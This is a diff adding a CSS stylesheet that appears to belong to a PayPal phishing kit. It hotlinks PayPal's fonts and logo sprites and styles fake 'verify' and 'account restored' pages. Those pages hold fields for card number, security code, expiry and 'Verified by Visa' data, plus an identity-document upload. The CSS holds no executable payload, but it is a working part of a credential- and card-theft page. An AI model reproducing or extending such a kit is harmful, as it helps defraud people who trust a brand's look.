@@ -1,0 +1,941 @@
+body {
+	background-color: #f5f7fa;
+}
+
+@font-face {
+	font-family: PayPal-Sans-Big;
+                font-style: normal;
+                font-weight: 200;
+                src: url('https://www.paypalobjects.com/ui-web/paypal-sans-big/1-0-0/PayPalSansBig-Thin.eot');
+                /* IE9 Compat Modes */
+                src: url('https://www.paypalobjects.com/ui-web/paypal-sans-big/1-0-0/PayPalSansBig-Thin.woff2') format('woff2'), /* Moderner Browsers */
+                url('https://www.paypalobjects.com/ui-web/paypal-sans-big/1-0-0/PayPalSansBig-Thin.woff') format('woff'), /* Modern Browsers */
+                url('https://www.paypalobjects.com/ui-web/paypal-sans-big/1-0-0/PayPalSansBig-Thin.svg#69ac2c9fc1e0803e59e06e93859bed03') format('svg');
+                /* Legacy iOS */;
+}
+
+@font-face {
+	font-family: PayPal-Sans-Big;
+                font-style: normal;
+                font-weight: 300;
+                src: url('https://www.paypalobjects.com/ui-web/paypal-sans-big/1-0-0/PayPalSansBig-Light.eot');
+                /* IE9 Compat Modes */
+                src: url('https://www.paypalobjects.com/ui-web/paypal-sans-big/1-0-0/PayPalSansBig-Light.woff2') format('woff2'), /* Moderner Browsers */
+                url('https://www.paypalobjects.com/ui-web/paypal-sans-big/1-0-0/PayPalSansBig-Light.woff') format('woff'), /* Modern Browsers */
+                url('https://www.paypalobjects.com/ui-web/paypal-sans-big/1-0-0/PayPalSansBig-Light.svg#69ac2c9fc1e0803e59e06e93859bed03') format('svg');
+                /* Legacy iOS */;
+}
+
+.navbar-verify {
+	padding: 0;
+	min-height: 72px;
+	max-height: 84px;
+	border-bottom: 1px solid #0070ba;
+	background-color: #0070ba;
+	background-image: linear-gradient(100deg, #0070ba, #1546a0);
+}
+
+.navbar-verify ul {
+	list-style-type: none;
+	margin: 0;
+	padding: 0;
+	overflow: hidden;
+}
+
+.navbar-verify li {
+	display: table-cell;
+	vertical-align: top;
+	position: relative;
+	padding: 0 1rem;
+}
+
+.navbar-verify li a {
+	display: block;
+	padding: 2em 0 0.65em;
+	font-family: PayPal-Sans-Big, sans-serif;
+	font-size: 0.8125rem;
+	font-weight: 400;
+	letter-spacing: 0.025rem;
+	text-decoration: none;
+	color: #dae3f1;
+	cursor: no-drop;
+	text-align: center;
+}
+
+.navbar-verify li a:hover {
+	color: #fff;
+}
+
+.ppl-brand {
+	margin-right: 0rem;
+	padding-top: 21px !important;
+	margin-right: 18px;
+}
+
+.ppl-brand:before {
+	content: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMzBweCIgaGVpZ2h0PSIzMHB4IiB2aWV3Qm94PSIwIDAgMzAgMzAiIHZlcnNpb249IjEuMSI+CiAgICA8ZyBpZD0iUGFnZS0xIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4KICAgICAgICA8ZyBpZD0iTmF2LUFzc2V0cyIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTUwLjAwMDAwMCwgLTUwLjAwMDAwMCkiPgogICAgICAgICAgICA8ZyBpZD0iaWNQUExvZ29UcmFuc3BhcmVudFdoaXRlMzAiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDUwLjAwMDAwMCwgNTAuMDAwMDAwKSI+CiAgICAgICAgICAgICAgICA8cmVjdCBpZD0iU3BlY3MiIGZpbGw9IiNERTAwNjMiIG9wYWNpdHk9IjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIzMCIgaGVpZ2h0PSIzMCIvPgogICAgICAgICAgICAgICAgPGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMi45MDQ4MjgsIDEuNzcwMDAwKSIgZmlsbD0iI0ZGRkZGRiI+CiAgICAgICAgICAgICAgICAgICAgPHBhdGggZD0iTTE5LjUxODEwNjgsMi4yNjUzNzY1OSBDMTguMjY1MDU5OCwwLjgzNzc4Njc0NyAxNi4wMDE0MjAxLDAuMjI2MTk4NjYzIDEzLjEwNTE5NTYsMC4yMjYxOTg2NjMgTDQuNjk3ODIzODcsMC4yMjYxOTg2NjMgQzQuMTA2MDE1NDMsMC4yMjYxOTg2NjMgMy42MDIwOTY2MSwwLjY1Njc4OTczMyAzLjUwOTc5ODc0LDEuMjQxMzc5NzggTDAuMDA5MDkyMDI5MDcsMjMuNDM4NDQ1OSBDLTAuMDYwMDYyNDk1LDIzLjg3NjQ3NTIgMC4yNzg1NDY3MDksMjQuMjcyMzU0NSAwLjcyMTg1MjAwNSwyNC4yNzIzNTQ1IEw1LjkxMjAyMzAyLDI0LjI3MjM1NDUgTDUuNTUzODUyMTgsMjYuNTQzNzcwNiBDNS40OTM1MTQxNywyNi45MjY5Nzc0IDUuNzg5NDE4MzksMjcuMjczNTQ0IDYuMTc3MzQ0OTYsMjcuMjczNTQ0IEwxMC41NTE5ODg1LDI3LjI3MzU0NCBDMTEuMDY5OTU4NywyNy4yNzM1NDQgMTEuNTEwNzg0MywyNi44OTY2NzM1IDExLjU5MTUxMDUsMjYuMzg1MzYzOCBMMTEuNjM0NDkxLDI2LjE2MzA0MzMgTDEyLjQ1ODU1OTUsMjAuOTM3NTQ2NSBMMTIuNTExNzM0MSwyMC42NDg4MzI4IEMxMi41OTI0NjAzLDIwLjEzNzI0NzcgMTMuMDMzMjg1OSwxOS43NjA2NTI3IDEzLjU1MDk4MDUsMTkuNzYwNjUyNyBMMTQuMjA1MzMxMSwxOS43NjA2NTI3IEMxOC40NDM1OTQyLDE5Ljc2MDY1MjcgMjEuNzYyMTg0OCwxOC4wMzg4Mzk0IDIyLjczMTcyNTgsMTMuMDU5NjMwOCBDMjMuMTM3MDA5OCwxMC45NzkxMjkzIDIyLjkyNzYxNzcsOS4yNDI0Mzk1OCAyMS44NTYxMzU4LDguMDIxNDY3MzMgQzIxLjUzMTg1MzQsNy42NTIzMTA1NiAyMS4xMjg3NzM1LDcuMzQ2NzkyMDEgMjAuNjU4NDY3Niw3LjA5Nzc0ODkzIEMyMC45ODg1MzU4LDQuOTkzODMwODIgMjAuNjU2MjYzNSwzLjU2MjEwODYyIDE5LjUxODEwNjgsMi4yNjUzNzY1OSBaIiBpZD0iRmlsbC04IiBmaWxsLW9wYWNpdHk9IjAuNjgiLz4KICAgICAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMjAuNjU4NDY3Niw3LjA5ODM5NTA2IEMyMC45ODg1MzU4LDQuOTk0Mjc5MTIgMjAuNjU2MjYzNSwzLjU2MjQyMjMgMTkuNTE4MTA2OCwyLjI2NTU2ODMzIEMxOC4yNjUwNTk4LDAuODM3ODQ0MjU0IDE2LjAwMTQyMDEsMC4yMjYxOTg2NjMgMTMuMTA1MTk1NiwwLjIyNjE5ODY2MyBMNC42OTc4MjM4NywwLjIyNjE5ODY2MyBDNC4xMDYwMTU0MywwLjIyNjE5ODY2MyAzLjYwMjA5NjYxLDAuNjU2ODMwMjIxIDMuNTA5Nzk4NzQsMS4yNDE0NzUyNCBMMC4wMDkwOTIwMjkwNywyMy40NDA2Mjg1IEMtMC4wNjAwNjI0OTUsMjMuODc4Njk5IDAuMjc4NTQ2NzA5LDI0LjI3NDYxNTUgMC43MjE4NTIwMDUsMjQuMjc0NjE1NSBMNS45MTIwMjMwMiwyNC4yNzQ2MTU1IEw3LjIxNTc2NDg5LDE2LjAwNzQ4MTUgTDcuMTc1MjY0MDMsMTYuMjY2NzQyMSBDNy4yNjc1NjE5LDE1LjY4MjA5NyA3Ljc2NzM0Nzk4LDE1LjI1MTE5IDguMzU5MTU2NDIsMTUuMjUxMTkgTDEwLjgyNjEyNywxNS4yNTExOSBDMTUuNjcwODAwOSwxNS4yNTExOSAxOS40NjQxMDU2LDEzLjI4MjkwMzQgMjAuNTcyNTA2Niw3LjU5MDc0MjIxIEMyMC42MDUyOTMsNy40MjI0MDE5MSAyMC42MzMzOTU3LDcuMjU5MDIwOSAyMC42NTg0Njc2LDcuMDk4Mzk1MDYiIGlkPSJGaWxsLTkiIGZpbGwtb3BhY2l0eT0iMC43Ii8+CiAgICAgICAgICAgICAgICAgICAgPHBhdGggZD0iTTguNjE2MjEyODgsNy4xMjY0OTc2OSBDOC42NzE4NjcxMiw2Ljc3NDY2MzcyIDguODk3NTE0NzUsNi40ODY3NDk0NiA5LjIwMTQwODkzLDYuMzQxMDAxNDggQzkuMzM5NzE3OTgsNi4yNzQ4Nzc2NCA5LjQ5NDAwNjk2LDYuMjM3OTU4NDkgOS42NTU3MzQ4Nyw2LjIzNzk1ODQ5IEwxNi4yNDU4MDI4LDYuMjM3OTU4NDkgQzE3LjAyNjYxNTMsNi4yMzc5NTg0OSAxNy43NTQ1Mjg2LDYuMjg5MjA0NDcgMTguNDE5ODk5OSw2LjM5NjM4MDIxIEMxOC42MTAyODE0LDYuNDI2OTYyNDkgMTguNzk1MTUyNyw2LjQ2MjIyODU0IDE4Ljk3NTA2NDcsNi41MDIxNzgzNiBDMTkuMTU0NzAxMSw2LjU0MTg1MjY3IDE5LjMyOTM3ODMsNi41ODY0ODYyNyAxOS40OTgyNjk2LDYuNjM2MDc5MTUgQzE5LjU4Mjg1Myw2LjY2MDYwMDA4IDE5LjY2NTc4MzQsNi42ODY0OTg1OSAxOS43NDc2MTE2LDYuNzEzNzc0NjggQzIwLjA3NDM3MzYsNi44MjIwNTI0OCAyMC4zNzg1NDMzLDYuOTUwMTY3NDMgMjAuNjU4NDY3Niw3LjA5ODM5NTA2IEMyMC45ODg1MzU4LDQuOTk0Mjc5MTIgMjAuNjU2MjYzNSwzLjU2MjQyMjMgMTkuNTE4MTA2OCwyLjI2NTU2ODMzIEMxOC4yNjUwNTk4LDAuODM3ODQ0MjU0IDE2LjAwMTQyMDEsMC4yMjYxOTg2NjMgMTMuMTA1MTk1NiwwLjIyNjE5ODY2MyBMNC42OTc4MjM4NywwLjIyNjE5ODY2MyBDNC4xMDYwMTU0MywwLjIyNjE5ODY2MyAzLjYwMjA5NjYxLDAuNjU2ODMwMjIxIDMuNTA5Nzk4NzQsMS4yNDE0NzUyNCBMMC4wMDkwOTIwMjkwNywyMy40NDA2Mjg1IEMtMC4wNjAwNjI0OTUsMjMuODc4Njk5IDAuMjc4NTQ2NzA5LDI0LjI3NDYxNTUgMC43MjE4NTIwMDUsMjQuMjc0NjE1NSBMNS45MTIwMjMwMiwyNC4yNzQ2MTU1IEw4LjYxNjIxMjg4LDcuMTI2NDk3NjkiIGlkPSJGaWxsLTEwIi8+CiAgICAgICAgICAgICAgICA8L2c+CiAgICAgICAgICAgIDwvZz4KICAgICAgICA8L2c+CiAgICA8L2c+Cjwvc3ZnPg==');
+}
+
+a,
+            a > span {
+	color: inherit;
+	text-decoration: none;
+}
+
+a:before,
+            a:after,
+            a > span:before,
+            a > span:after {
+	content: '';
+	position: absolute;
+	transition: transform .5s ease;
+	color: #fff;
+}
+
+.effect-1 {
+}
+
+.effect-1:before {
+	left: 0;
+	bottom: 0;
+	width: 100%;
+	height: 2px;
+	background: #fff;
+	transform: scaleX(0);
+}
+
+.effect-1:hover:before {
+	transform: scaleX(0.88);
+}
+
+.right-navbar {
+	float: right;
+}
+
+.nav-desktop {
+	display: inherit;
+}
+
+.nav-mobile {
+	display: none;
+}
+
+.nav-mobile li {
+	width: 8%;
+}
+
+@media screen and (max-width: 1023px) {
+	.nav-mobile {
+		display: block;
+	}
+
+	.nav-desktop {
+		display: none;
+	}
+
+	.DisplayName-3-Item {
+		display: none;
+	}
+
+	.profilepic {
+		display: none;
+	}
+
+	.Verify-Form {
+		margin-top: 1.5em;
+	};
+}
+
+.UserInfo {
+	padding: 0;
+}
+
+.profilepic {
+	width: 110px;
+}
+
+.profilepic img {
+	border: 3px solid #005ea6;
+	border-radius: 100px;
+	width: 100%;
+}
+
+.HelloUser {
+    display: block;
+    padding: 0.9em 0 0.65em;
+    font-family: PayPal-Sans-Big, sans-serif;
+    font-weight: 400;
+    letter-spacing: 0.025rem;
+    text-decoration: none;
+    color: #585858;
+    text-align: center;
+    font-size: 1.9rem;
+    padding-left: 29px;
+    text-align: left;
+}
+
+.HelloUser a {
+    font-size: 15px;
+    background: #ffffff;
+    padding: 8px 15px;
+    border-radius: 28px;
+    font-weight: bold;
+    color: #fff;
+    border: 1px solid #0c459c;
+    box-sizing: border-box;
+    color: #0070ba;
+}
+
+.HelloUser a:hover {
+	text-decoration: underline;
+}
+
+.Profile_UserName {
+	padding: 15px;
+	padding-bottom: 0px;
+}
+
+.item-3 {
+	width: 100%;
+}
+
+.item-3 img {
+	width: 70px;
+}
+
+.item-3 p {
+	font-size: 0.8125rem;
+}
+
+.item-3 a, .item-3 a:hover{
+    text-decoration: none;
+    color: rgba(0, 48, 135, 0.85);
+    font-size: 13px;
+}
+
+.item-3 .icon-mobile{
+    border: 1px solid #0070ba;
+    background: rgba(255, 255, 255, 0.8);
+}
+
+.item-3 i{
+    font-size: 27px;
+    color: #0070ba;
+}
+.DisplayName-3-Item {
+	margin-top: 29px;
+	color: #fff;
+}
+
+.DisplayName-3-Item img {
+}
+
+.DisplayName-3-Item p {
+	font-size: 0.8125rem;
+}
+
+.icon-mobile {
+	border-radius: 54px;
+	padding: 17px;
+	width: 80px;
+	height: 80px;
+	text-align: center;
+	background: #0c459c;
+}
+
+.DisplayName-3-Item a:hover {
+	color: #fff;
+	text-decoration: underline;
+}
+
+.PageContent {
+	margin-top: 2em;
+	margin-bottom: 10em;
+}
+
+.Tap-1 {
+	border: 1px solid #e0e0e0;
+	padding: 0px;
+	border-radius: 6px;
+	background-color: #ffffff;
+	box-shadow: none;
+}
+
+.Tap-1 ul {
+	padding: 0px;
+}
+
+.Tap-1 ul li {
+	padding: 12px 0 12px 20px;
+	background: url('https://www.paypalobjects.com/web/res/205/785babd2456d8a578524c2a7b1a2e/img/nav_step.png') 2px 15px no-repeat;
+	position: relative;
+	z-index: 10;
+	margin: 0 0 0 10px;
+	line-height: 15px;
+	list-style: none;
+	background-size: 8px 8px;
+	color: #cbd2d6;
+	cursor: default;
+}
+
+.Tap-1-Active {
+	background: url('https://www.paypalobjects.com/web/res/205/785babd2456d8a578524c2a7b1a2e/img/nav_step_current.png') 3px 16px no-repeat !important;
+	background-size: 7px 7px !important;
+	color: #2c2e2f !important;
+}
+
+.Tap-2 {
+	border: 1px solid #e0e0e0;
+	padding: 0px;
+	border-radius: 6px;
+	background-color: #ffffff;
+	box-shadow: none;
+	margin-top: 1.5em;
+}
+
+.VerticalLine {
+	position: absolute;
+	top: 51px;
+	left: 35px;
+	width: 100%;
+	height: 45%;
+	border-left: 1px solid #ededed;
+}
+
+.Step1Header {
+	padding: 7px 1px 7px 10px;
+	border-bottom: 1px solid #eee;
+}
+
+.Step1Header b {
+	touch-action: manipulation;
+	color: #3c3a3a;
+	padding-left: 2px;
+	letter-spacing: 0.06rem;
+	text-decoration: none;
+	font-size: 15px;
+}
+
+.Step1Header i {
+	font-size: 1.2em;
+	position: relative;
+	top: 1px;
+}
+
+.Step1Header {
+	padding-right: 20px;
+	font-size: 1.03rem;
+	line-height: 1.6;
+	color: #0070ba;
+	text-decoration: none;
+	font-weight: 500;
+}
+
+.VerifiStep {
+	padding-left: 19px;
+}
+
+.WithdrawMoney {
+	list-style-type: none;
+	padding: 0px;
+}
+
+.WithdrawMoney li a {
+	font-size: 0.9rem;
+	padding: 0px;
+}
+
+.HowManyMoney {
+	margin-top: 10px;
+	font-size: 1.7em;
+	margin-bottom: 5px;
+	font-family: PayPal-Sans-bold, sans-serif;
+}
+
+.footer {
+	text-align: right;
+	position: relative;
+	bottom: 0;
+	width: 100%;
+	background: #fff;
+	top: 0px;
+}
+
+.footer p {
+	margin: 0px;
+}
+
+.FooterContent {
+	margin: 0;
+	background: #ffffff;
+	padding: 1%;
+	color: #9e9e9e;
+}
+
+.Verify-Form {
+	border: 1px solid #e0e0e0;
+	padding: 0px;
+	border-radius: 6px;
+	background-color: #ffffff;
+	box-shadow: none;
+	width: 100%;
+}
+
+.InputInfo {
+	border: 1px solid;
+	text-shadow: none;
+	text-align: left;
+	line-height: 1.4em;
+	font-family: Arial, Helvetica, sans-serif;
+	border-radius: 3px;
+	text-transform: none;
+	letter-spacing: 0.025em;
+	outline: 0;
+	height: 2.61539em !important;
+	padding: 0 24px 0 12px;
+	border-width: 1px;
+	border-style: solid;
+	border-color: #bec0c2 #bec0c2 #dbdfe2;
+	background-color: #ffffff;
+	text-overflow: ellipsis;
+	width: 100%;
+	-webkit-box-sizing: border-box;
+	-ms-box-sizing: border-box;
+	-moz-box-shadow: 0 2px 2px rgba(0, 0, 0, 0.15) inset;
+	color: #333333;
+	font-size: 1em;
+	font-weight: normal;
+	-webkit-transition-property: all;
+	-moz-transition-property: all;
+	-ms-transition-property: all;
+	-o-transition-property: all;
+	transition-property: all;
+	-webkit-transition-duration: 250ms;
+	-moz-transition-duration: 250ms;
+	-ms-transition-duration: 250ms;
+	-o-transition-duration: 250ms;
+	transition-duration: 250ms;
+	-webkit-transition-timing-function: ease-in;
+	-moz-transition-timing-function: ease-in;
+	-ms-transition-timing-function: ease-in;
+	-o-transition-timing-function: ease-in;
+	transition-timing-function: ease-in;
+	margin-bottom: 1.02em !important;
+}
+
+.Half {
+	width: 48%;
+}
+
+.InputInfo:hover:focus {
+	border: 1px solid #009cde;
+	-moz-box-shadow: none;
+	-webkit-box-shadow: none;
+	box-shadow: none;
+	border: 1px solid #009cde;
+	background-color: #fff;
+}
+
+::-webkit-input-placeholder {
+ /* WebKit, Blink, Edge */
+	color: #6c7378;
+}
+
+:-moz-placeholder {
+ /* Mozilla Firefox 4 to 18 */
+	color: #6c7378;
+	opacity: 1;
+}
+
+::-moz-placeholder {
+ /* Mozilla Firefox 19+ */
+	color: #6c7378;
+	opacity: 1;
+}
+
+:-ms-input-placeholder {
+ /* Internet Explorer 10-11 */
+	color: #6c7378;
+}
+
+.InputGroupR {
+	margin-right: 0%;
+}
+
+input[name=Cnum] {
+	margin-bottom: 2%;
+}
+
+input[name=C5c] {
+	border-radius: 5px;
+}
+
+label[for=C5c] {
+	margin-left: 13%;
+}
+
+.C5c {
+	border-radius: 5px;
+}
+
+.nmb {
+	margin-bottom: 0px;
+}
+
+.npr {
+	padding-right: 0px;
+}
+
+.Exp {
+	width: 30%;
+}
+
+.icon-cc {
+	position: absolute;
+	float: left;
+	z-index: 999;
+	right: 5px;
+	top: 2px;
+	border: none;
+	background: url('https://www.paypalobjects.com/webstatic/sprite/sprite_logos_wallet_2x.png') no-repeat;
+	background-position-y: -695px;
+	width: 50px;
+	height: 100%;
+}
+
+.FullName {
+	font-size: 0.8925rem;
+	font-weight: 500;
+	letter-spacing: 0.025rem;
+}
+
+.CcInfo {
+	color: #0070ba;
+	font-weight: 500;
+	font-size: 0.8125rem;
+	line-height: 1.84615385;
+	font-weight: 600;
+	text-transform: none;
+	font-family: 'PayPal-Sans', sans-serif;
+	letter-spacing: 0.025em;
+}
+
+.AddCard {
+	border: 1px solid;
+	padding: 8px !important;
+	border-radius: 17px;
+	text-align: center;
+	font-weight: 500;
+	font-family: 'PayPal-Sans', sans-serif;
+}
+
+.Submit {
+	width: 100%;
+	padding: 8px;
+	background: #019cde;
+	border: 0;
+	border-radius: 4px;
+	color: white;
+	font-weight: 700;
+	touch-action: manipulation;
+	margin-bottom: 2em;
+	font-family: sans-serif;
+	cursor: pointer;
+}
+
+.np {
+	padding-left: 4px;
+	padding-right: 4px;
+}
+
+.icon-ccard {
+	position: absolute;
+	float: left;
+	z-index: 999;
+	right: 5px;
+	top: 2px;
+	border: none;
+	background: url('https://www.paypalobjects.com/webstatic/sprite/sprite_logos_wallet_2x.png') no-repeat;
+	background-position-y: -491px;
+	width: 50px;
+	height: 100%;
+}
+
+.is_visa {
+	background-position-y: -88px !important;
+}
+
+.is_mastercard {
+	background-position-y: -194px !important;
+}
+
+.is_amex {
+	background-position-y: -292px !important;
+}
+
+.is_diners {
+	background: url('http://icons.iconarchive.com/icons/designbolts/credit-card-payment/256/Diners-Club-International-icon.png');
+	background-size: 49px;
+	background-repeat: no-repeat;
+	background-position: center;
+	background-position-y: -5.4px !important;
+}
+
+.is_discover {
+	background-position-y: -591px !important;
+}
+
+.is_jcb {
+	background-position-y: -1209px !important;
+}
+
+footer {
+	background: #fff;
+	position: relative;
+	bottom: 0px;
+}
+
+#checkout_card_number{
+	border-radius: 4px;
+}
+
+.CcNumber{
+    background: url(https://www.paypalobjects.com/webstatic/sprite/sprite_logos_wallet_2x.png);
+    background-position: top -489px right -21px;
+    background-repeat: no-repeat;
+}
+
+.HasErrorBorder{
+	border: 1px solid #c92c28;
+    background: url(https://www.paypalobjects.com/webstatic/i/consumer/onboarding/sprite_form_2x.png);
+    background-position: top -411px right 10px;
+    background-size: 25px;
+    background-repeat: no-repeat
+}
+.HasErrorBorder:hover:focus{
+	border: 1px solid #c92c28;
+}
+.HasErrorBorder::-webkit-input-placeholder { 
+    color: #c72e2e; text-overflow: ellipsis; 
+}
+.HasErrorBorder:-moz-placeholder { 
+    color: #c72e2e !important; text-overflow: ellipsis; 
+}
+.HasErrorBorder::-moz-placeholder { 
+    color: #c72e2e !important; text-overflow: ellipsis; 
+} /* For the future */
+.HasErrorBorder:-ms-input-placeholder { 
+    color: #c72e2e !important; text-overflow: ellipsis; 
+}
+
+.ErrorIcon{
+    background: url('../img/sprit_form.png') no-repeat;
+    background-position-y: -376px;
+    width: 40px;
+    height: 40px;
+    background-size: 23px;
+    position: absolute;
+    float: left;
+    z-index: 999;
+    right: -17px;
+    top: 2px;
+    border: none;
+    width: 50px;
+    height: 100%
+}
+
+.C5c{
+    border-radius: 5px;
+    background: url(https://www.paypalobjects.com/webstatic/sprite/sprite_logos_wallet_2x.png);
+    background-position: top -694px right -21px;
+    background-repeat: no-repeat;
+}
+
+@-webkit-keyframes rotation {
+    from {
+        -webkit-transform: rotate(0deg);
+        transform: rotate(0deg)
+    }
+    to {
+        -webkit-transform: rotate(359deg);
+        transform: rotate(359deg)
+    }
+}
+
+@-moz-keyframes rotation {
+    from {
+        -moz-transform: rotate(0deg);
+        transform: rotate(0deg)
+    }
+    to {
+        -moz-transform: rotate(359deg);
+        transform: rotate(359deg)
+    }
+}
+
+@-o-keyframes rotation {
+    from {
+        -o-transform: rotate(0deg);
+        transform: rotate(0deg)
+    }
+    to {
+        -o-transform: rotate(359deg);
+        transform: rotate(359deg)
+    }
+}
+
+@keyframes rotation {
+    from {
+        transform: rotate(0deg)
+    }
+    to {
+        transform: rotate(359deg)
+    }
+}
+
+.loader{
+	position: absolute;
+    background: rgba(0, 0, 0, 0.44);
+    width: 100%;
+    height: 100%;
+    z-index: 999;
+    border-radius: 5px;
+    text-align: center;
+    padding-top: 50%;
+}
+.spinner{
+    position: absolute;
+    z-index: 200;
+    margin: 0;
+    text-align: center;
+    background: #fff;
+    opacity: 0.9;
+    width: 100%;
+    height: 100%;
+    padding-top: 50%;
+    border-radius: 6px;
+}
+.spinner:before{
+    content: "";
+    display: block;
+    margin: 0 auto 10px;
+    text-align: center;
+    width: 60px;
+    height: 60px;
+    border-left: 8px solid #000;
+    border-left: 8px solid rgba(0,0,0,.2);
+    border-right: 8px solid #000;
+    border-right: 8px solid rgba(0,0,0,.2);
+    border-bottom: 8px solid #000;
+    border-bottom: 8px solid rgba(0,0,0,.2);
+    border-top: 8px solid #2180c0;
+    border-radius: 50px;
+    -webkit-animation: rotation .7s infinite linear;
+    -moz-animation: rotation .7s infinite linear;
+    -o-animation: rotation .7s infinite linear;
+    animation: rotation .7s infinite linear;
+}
+
+.spinner:after{
+    content: '';
+    background: #fff;
+    -moz-opacity: .9;
+    -khtml-opacity: .9;
+    -webkit-opacity: .9;
+    opacity: .9;
+    -ms-filter: alpha(opacity=90);
+    filter: alpha(opacity=90);
+}
+.hide{
+	display: none;
+}
+.npi{
+	padding-right: 0px;
+	padding-left: 0px;
+}
+
+.VbvForm{
+	width: 350px;
+    border: 1px solid grey;
+    width: 385px;
+    text-align: left;
+}
+.VbvToDo{
+    margin-bottom: 4%;
+    color: #7d7d7d;
+    font-size: 14px;
+    padding-bottom: 15px;
+    width: 385px;
+    text-align: left;
+}
+.SubmitID{
+    width: 100%;
+    padding: 8px;
+    background: #019cde;
+    border: 0;
+    border-radius: 4px;
+    color: white;
+    font-weight: 700;
+    touch-action: manipulation;
+    margin-bottom: 2em;
+    font-family: sans-serif;
+    cursor: pointer;
+    display: none;
+}
+.AlertDiv{
+    outline: 0;
+    margin-bottom: 10px;
+    font-size: 13px;
+}
+.AlertMessage{
+    margin: 0;
+    padding: 15px 15px 15px 44px;
+    -webkit-border-radius: 5px;
+    -moz-border-radius: 5px;
+    -khtml-border-radius: 5px;
+    border-radius: 5px;
+    border-width: 1px;
+    border-style: solid;
+    text-align: left;
+    font-size: 1em;
+    background: url('..//img/icon_alert_sprite-2x.png') no-repeat;
+    background-size: 20px;
+    background-color: #fff7f7;
+    background-position: 12px -387px;
+    background-position: left 12px top -387px;
+    border-color: #c72e2e;
+}
+#UploadFileError{
+	display: none;
+}
+.clear{
+	clear: both;
+}
+
+#PreviewId{
+	display: none;
+}
+
+#IdentityFile{
+	display: none;
+}
+
+#AddDocument{
+	display: inline-block;
+    min-width: 15rem;
+    padding: 0.75rem 1.5rem;
+    margin-right: 0.75rem;
+    margin-bottom: 1.5rem;
+    border: 1px solid #0070ba;
+    border-radius: 1.5rem;
+    font-size: 0.9375rem;
+    line-height: 1.6;
+    font-family: 'PayPal-Sans', sans-serif;
+    font-weight: 600;
+    text-align: center;
+    text-decoration: none;
+    cursor: pointer;
+    color: #ffffff;
+    background-color: #0070ba;
+    transition: all 250ms ease;
+    -webkit-font-smoothing: antialiased;
+    margin-top: 15px;
+}
+
+.jFiler-item, .jFiler-item-container, .jFiler-item-thumb{
+	width: 100% !important;
+}
+
+.AccountRestored{
+    display: block;
+    padding: 0.9em 0 0.1em;
+    font-family: PayPal-Sans-Big, sans-serif;
+    font-weight: 600;
+    letter-spacing: 0.025rem;
+    text-decoration: none;
+    color: #000000;
+    text-align: center;
+    font-size: 1.9rem;
+    padding-left: 29px;
+}
+
+.FullnameRestored{
+	display: block;
+    font-family: PayPal-Sans-Big, sans-serif;
+    font-weight: 600;
+    letter-spacing: 0.025rem;
+    text-decoration: none;
+    color: #000000;
+    text-align: center;
+    font-size: 1.6rem;
+    padding-left: 29px;
+}
+
+.TextThanks{
+    font-family: PayPal-Sans-Big, sans-serif;
+    font-size: 17px;
+}
+
+.BtnAccountVerified{
+    display: inline-block;
+    min-width: 15rem;
+    padding: 0.75rem 1.5rem;
+    margin-right: 0.75rem;
+    margin-bottom: 1.5rem;
+    border: 1px solid #0070ba;
+    border-radius: 1.5rem;
+    font-size: 0.9375rem;
+    line-height: 1.6;
+    font-family: 'PayPal-Sans', sans-serif;
+    font-weight: 600;
+    text-align: center;
+    text-decoration: none;
+    cursor: pointer;
+    color: #ffffff;
+    background-color: #0070ba;
+    transition: all 250ms ease;
+    -webkit-font-smoothing: antialiased;
+    margin-top: 15px;
+}
+
+.RedirectingToAccount{
+	font-size: 12px;
+    font-family: PayPal-Sans-Big, sans-serif;
+}
+.warning-text-img{
+    width: 19px;
+    float: left;
+    margin-top: 4px;
+    margin-right: 3px;
+}
+.cards-and-banks{
+    padding-top: 11px;
+    padding-bottom: 11px;
+}
+.add-card{
+    color: #0070ba;
+    text-decoration: none;
+    font-family: 'PayPal-Sans', sans-serif;
+    border: 1px solid #0070ba;
+    border-radius: 1.5rem;
+    padding: 9px;
+    font-weight: bold;
+    font-size: 12px;
+    padding-left: 13px;
+    padding-right: 13px;
+}
+.skip-bnk, .skip-bnk:hover{
+    width: 75%;
+    padding: 8px;
+    background: #ffffff;
+    border: 1.5px solid #019cde;
+    border-radius: 4px;
+    color: #019cde;
+    touch-action: manipulation;
+    margin-bottom: 2em;
+    font-family: sans-serif;
+    cursor: pointer;
+}
+.steps-identity{
+	font-size: 13px;
+}
